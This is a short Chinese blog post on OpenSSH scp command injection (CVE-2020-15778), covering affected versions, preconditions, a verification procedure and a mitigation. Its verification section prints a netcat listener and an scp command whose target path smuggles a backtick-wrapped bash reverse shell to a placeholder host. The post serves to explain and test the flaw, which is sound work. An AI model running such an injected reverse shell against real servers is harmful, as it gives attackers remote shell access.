# OpenSSH 命令注入漏洞 CVE-2020-15778 - 乒·乓 - 博客园

> 原文：[`www.cnblogs.com/fh0312/p/16229349.html`](https://www.cnblogs.com/fh0312/p/16229349.html)

OpenSSH 命令注入漏洞

漏洞编号：

CVE-2020-15778

漏洞介绍：

OpenSSH（OpenBSD Secure Shell）是 OpenBSD 计划组的一套用于安全访问远程计算机的连接工具。该工具是 SSH 协议的开源实现，支持对所有的传输进行加密，可有效阻止窃听、连接劫持以及其他网络级的攻击。*OpenSSH 8.6p1 及之前版本中的 scp 的 scp.c 文件存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。*该漏洞发生于 OpenSSH <= 8.3p1 系统，即使在禁用 ssh 登录的情况下，但是允许使用 scp 传文件，而且远程服务器允许使用反引号(`)，可利用 scp 复制文件到远程服务器时，执行带有 payload 的 scp 命令，从而在后续利用中 getshell。scp 是 secure copy 的缩写, scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令。linux 的 scp 命令可以在 linux 服务器之间复制文件和目录。

漏洞验证：

1、靶机开启 ssh 服务（Linux）

开启 ssh：systemctl start sshd

版本号：openssh <= openssh-8.3p1

前提条件：知道靶机用户名和密码

2、kali 开启本地监听

#开启监听

nc -lvvp 9999

#反弹 shell

Scp test.txt username@target:`’bash -i >& /dev/tcp/localhost/localport 0>&1` /tmp/test1.txt’

#输入密码（kali 默认无显示）

漏洞修复：

可以禁用 scp，改用[rsync](https://so.csdn.net/so/search?q=rsync&spm=1001.2101.3001.7020)等缓解风险（可能会导致小文件机器内拷贝变慢）